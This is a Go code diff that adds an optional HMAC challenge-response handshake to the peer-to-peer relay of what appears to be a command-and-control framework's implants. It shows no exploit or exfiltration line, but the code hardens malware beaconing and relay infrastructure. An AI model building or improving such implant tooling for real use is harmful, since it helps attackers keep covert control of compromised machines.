@@ -4,6 +4,10 @@
 package main
 
 import (
+	"crypto/hmac"
+	"crypto/rand"
+	"crypto/sha256"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
@@ -58,15 +62,88 @@ func p2pEnvelopeUUID(body []byte) string {
 const maxP2PChildren = 256
 
 // p2pConnLimits bounds inbound P2P relay connections to resist slot-exhaustion
-// and relay/reflector abuse from a single source (B3). The relay path currently
-// has no mutual authentication — that requires a server-issued shared P2P key —
-// so connection limiting is the available defense-in-depth control: a single
-// peer (or spoofed source) cannot open an unbounded number of relay sockets to
-// claim UUIDs or hold the parent's relay slots.
+// and relay/reflector abuse from a single source (B3). The relay path has
+// opt-in mutual authentication via p2pServerAuth/p2pClientAuth: when
+// P2PSharedSecret is stamped into both the parent and child implants, every
+// relay connection must prove knowledge of that key (HMAC challenge) before any
+// envelope is accepted. With no shared secret configured (legacy mode) the relay
+// relies on connection limiting as the only defense-in-depth control.
 const (
 	p2pMaxTotalConns = 256
 	p2pMaxConnsPerIP = 32
 )
+
+// p2pSharedKey returns the raw P2P shared key, or nil when auth is disabled
+// (P2PSharedSecret empty). The secret is base64-decoded; a wrong size is treated
+// as disabled so a misconfiguration degrades to "no auth" rather than crashing.
+func p2pSharedKey() []byte {
+	if P2PSharedSecret == "" {
+		return nil
+	}
+	b, err := base64.StdEncoding.DecodeString(P2PSharedSecret)
+	if err != nil || len(b) == 0 {
+		return nil
+	}
+	return b
+}
+
+// hmacSum returns HMAC-SHA256(keyed with key) over msg.
+func hmacSum(msg, key []byte) []byte {
+	m := hmac.New(sha256.New, key)
+	m.Write(msg)
+	return m.Sum(nil)
+}
+
+// p2pServerAuth performs the parent (server) side of the optional P2P mutual
+// auth handshake. It is a no-op returning true when no shared key is configured
+// (backward compatible). Otherwise it issues a random nonce and verifies the
+// child's HMAC-SHA256(nonce, key). A short deadline bounds the exchange so a
+// non-cooperative peer cannot hang the connection slot. Caller must close conn
+// on a false return.
+func p2pServerAuth(conn net.Conn) bool {
+	key := p2pSharedKey()
+	if key == nil {
+		return true
+	}
+	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
+	defer conn.SetDeadline(time.Time{})
+
+	var nonce [32]byte
+	if _, err := rand.Read(nonce[:]); err != nil {
+		return false
+	}
+	if _, err := conn.Write(nonce[:]); err != nil {
+		return false
+	}
+	var mac [32]byte
+	if _, err := io.ReadFull(conn, mac[:]); err != nil {
+		return false
+	}
+	want := hmacSum(nonce[:], key)
+	return hmac.Equal(want, mac[:])
+}
+
+// p2pClientAuth performs the child (client) side of the optional P2P mutual
+// auth handshake. No-op returning true when no shared key is configured. It
+// reads the parent's nonce and replies with HMAC-SHA256(nonce, key).
+func p2pClientAuth(conn net.Conn) bool {
+	key := p2pSharedKey()
+	if key == nil {
+		return true
+	}
+	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
+	defer conn.SetDeadline(time.Time{})
+
+	var nonce [32]byte
+	if _, err := io.ReadFull(conn, nonce[:]); err != nil {
+		return false
+	}
+	mac := hmacSum(nonce[:], key)
+	if _, err := conn.Write(mac[:]); err != nil {
+		return false
+	}
+	return true
+}
 
 var (
 	p2pConnLimiterMu sync.Mutex
@@ -275,6 +352,15 @@ func p2pHandleChild(conn net.Conn) {
 		return
 	}
 	defer p2pEndConn(conn)
+	// Optional mutual-auth handshake (E2). When P2PSharedSecret is configured
+	// on both peers, a child that cannot prove the key is dropped before it can
+	// queue any envelope — closing the "no mutual authentication" gap.
+	if !p2pServerAuth(conn) {
+		if Debug {
+			fmt.Printf("[!] p2p: rejected inbound relay connection from %s (auth failed)\n", p2pConnKey(conn))
+		}
+		return
+	}
 	// Cover the whole relay round-trip: read + queue + server beacon + reply.
 	conn.SetDeadline(time.Now().Add(p2pRelayTimeout + 30*time.Second))
 
@@ -344,6 +430,11 @@ func sendP2PTCPBeacon(body []byte) []byte {
 		return nil
 	}
 	defer conn.Close()
+
+	// Optional mutual-auth handshake (E2) before sending the envelope.
+	if !p2pClientAuth(conn) {
+		return nil
+	}
 
 	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
 		return nil
